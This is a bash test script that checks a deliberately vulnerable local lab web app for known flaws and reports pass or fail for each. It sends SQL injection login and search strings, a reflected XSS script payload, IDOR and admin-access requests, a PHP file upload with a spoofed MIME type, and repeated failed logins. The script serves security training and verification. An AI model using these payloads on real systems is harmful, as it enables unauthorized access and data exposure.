#!/usr/bin/env bash
set -u

# Authorized local lab only. This script intentionally exercises vulnerable routes.
BASE_URL="${BASE_URL:-http://127.0.0.1:8000}"
TMP_DIR="$(mktemp -d)"
USER1_COOKIE="$TMP_DIR/user1.cookies"
USER2_COOKIE="$TMP_DIR/user2.cookies"
PASS_COUNT=0
FAIL_COUNT=0

cleanup() {
  rm -rf "$TMP_DIR"
}
trap cleanup EXIT

pass() {
  PASS_COUNT=$((PASS_COUNT + 1))
  printf '[PASS] %s\n' "$1"
}

fail() {
  FAIL_COUNT=$((FAIL_COUNT + 1))
  printf '[FAIL] %s\n' "$1"
}

status_code() {
  curl -sS -o /dev/null -w '%{http_code}' "$@"
}

printf 'Target: %s\n\n' "$BASE_URL"

if [ "$(status_code "$BASE_URL/posts")" = "200" ]; then
  pass 'Application is reachable'
else
  fail 'Application is not reachable'
  exit 1
fi

# Seed account login
curl -sS -c "$USER1_COOKIE" -o /dev/null \
  --data-urlencode 'username=user1' \
  --data-urlencode 'password=password123' \
  "$BASE_URL/login"

curl -sS -c "$USER2_COOKIE" -o /dev/null \
  --data-urlencode 'username=user2' \
  --data-urlencode 'password=password123' \
  "$BASE_URL/login"

# B-01 Login SQL Injection
LOGIN_SQLI_CODE="$(status_code \
  --data-urlencode "username=' OR '1'='1' --" \
  --data-urlencode 'password=x' \
  "$BASE_URL/login")"
[ "$LOGIN_SQLI_CODE" = "303" ] && pass 'B-01 Login SQL Injection' || fail 'B-01 Login SQL Injection'

# B-02 Search SQL Injection
curl -sS -b "$USER1_COOKIE" --get \
  --data-urlencode "keyword=') OR '1'='1' --" \
  "$BASE_URL/posts" -o "$TMP_DIR/search-sqli.html"
if grep -q 'href="/posts/private/' "$TMP_DIR/search-sqli.html"; then
  pass 'B-02 Search SQL Injection exposes private post links'
else
  fail 'B-02 Search SQL Injection'
fi

# B-04 Reflected XSS (HTML injection; browser execution is a manual check)
curl -sS --get \
  --data-urlencode "keyword=<script>alert('reflected-xss')</script>" \
  "$BASE_URL/posts" -o "$TMP_DIR/reflected-xss.html"
if grep -q "<script>alert('reflected-xss')</script>" "$TMP_DIR/reflected-xss.html"; then
  pass 'B-04 Reflected XSS payload is rendered unescaped'
else
  fail 'B-04 Reflected XSS'
fi

# B-05 IDOR (seed data: post 4 belongs to user2)
IDOR_CODE="$(status_code -b "$USER1_COOKIE" "$BASE_URL/posts/private/4")"
[ "$IDOR_CODE" = "200" ] && pass 'B-05 Private post IDOR' || fail 'B-05 Private post IDOR'

# B-06 Missing admin role check
ADMIN_CODE="$(status_code -b "$USER1_COOKIE" "$BASE_URL/admin")"
[ "$ADMIN_CODE" = "200" ] && pass 'B-06 General user can access admin page' || fail 'B-06 Admin access control'

# B-07 Unauthorized deletion: create as user2, delete as user1
curl -sS -b "$USER2_COOKIE" -D "$TMP_DIR/victim.headers" -o /dev/null \
  --data-urlencode "title=poc-delete-$RANDOM" \
  --data-urlencode 'content=owned by user2' \
  "$BASE_URL/posts/new"
VICTIM_LOCATION="$(awk 'tolower($1)=="location:" {gsub("\r", ""); print $2}' "$TMP_DIR/victim.headers")"
VICTIM_ID="${VICTIM_LOCATION##*/}"
DELETE_CODE="$(status_code -b "$USER1_COOKIE" -X POST "$BASE_URL/posts/$VICTIM_ID/delete")"
LOOKUP_CODE="$(status_code "$BASE_URL/posts/$VICTIM_ID")"
if [ "$DELETE_CODE" = "303" ] && [ "$LOOKUP_CODE" = "404" ]; then
  pass 'B-07 General user can delete another user post'
else
  fail 'B-07 Unauthorized post deletion'
fi

# B-08 Unrestricted upload
printf '<?php echo "poc"; ?>\n' > "$TMP_DIR/poc.php"
UPLOAD_CODE="$(status_code -b "$USER1_COOKIE" -F "file=@$TMP_DIR/poc.php;type=text/html" "$BASE_URL/upload")"
[ "$UPLOAD_CODE" = "303" ] && pass 'B-08 PHP extension and spoofed MIME upload' || fail 'B-08 Unrestricted upload'

# B-09 Weak password and no retry/lockout
WEAK_USER="poc_weak_$(date +%s)"
WEAK_CODE="$(status_code \
  --data-urlencode "username=$WEAK_USER" \
  --data-urlencode 'password=1234' \
  --data-urlencode 'nickname=poc-weak' \
  "$BASE_URL/register")"
for _ in 1 2 3 4 5 6 7 8 9 10; do
  curl -sS -o /dev/null \
    --data-urlencode 'username=user1' \
    --data-urlencode 'password=wrong' \
    "$BASE_URL/login"
done
AFTER_FAILURE_CODE="$(status_code \
  --data-urlencode 'username=user1' \
  --data-urlencode 'password=password123' \
  "$BASE_URL/login")"
if [ "$WEAK_CODE" = "303" ] && [ "$AFTER_FAILURE_CODE" = "303" ]; then
  pass 'B-09 Weak password and unlimited login retries'
else
  fail 'B-09 Authentication failure controls'
fi

# B-10 Missing security events
curl -sS -b "$USER1_COOKIE" "$BASE_URL/admin/security-events" -o "$TMP_DIR/events.html"
if grep -q '현재 기록된 활동이 없습니다' "$TMP_DIR/events.html"; then
  pass 'B-10 Security event list remains empty after attacks'
else
  fail 'B-10 Security logging failure'
fi

# B-11 Exception exposure
curl -sS "$BASE_URL/debug/error" -o "$TMP_DIR/error.html"
curl -sS "$BASE_URL/debug/db-error" -o "$TMP_DIR/db-error.html"
curl -sS "$BASE_URL/debug/path-error" -o "$TMP_DIR/path-error.html"
if grep -q 'Intentional debug error' "$TMP_DIR/error.html" \
  && grep -q 'not_existing_table' "$TMP_DIR/db-error.html" \
  && grep -q '/app/routers/errors.py' "$TMP_DIR/path-error.html"; then
  pass 'B-11 Exception, SQL, and internal path details are exposed'
else
  fail 'B-11 Exceptional condition exposure'
fi

# B-12 Docs and missing headers
DOCS_CODE="$(status_code "$BASE_URL/docs")"
curl -sS -D "$TMP_DIR/headers.txt" -o /dev/null "$BASE_URL/posts"
if [ "$DOCS_CODE" = "200" ] \
  && ! grep -qi '^content-security-policy:' "$TMP_DIR/headers.txt" \
  && ! grep -qi '^x-frame-options:' "$TMP_DIR/headers.txt" \
  && ! grep -qi '^x-content-type-options:' "$TMP_DIR/headers.txt"; then
  pass 'B-12 API docs exposed and security headers missing'
else
  fail 'B-12 Security misconfiguration'
fi

printf '\nResult: %s passed, %s failed\n' "$PASS_COUNT" "$FAIL_COUNT"
printf 'Note: browser alert execution and stored/comment XSS are completed manually using docs/red-team/poc-guide.md.\n'
printf 'Note: this script creates disposable PoC rows in the local lab database.\n'

[ "$FAIL_COUNT" -eq 0 ]
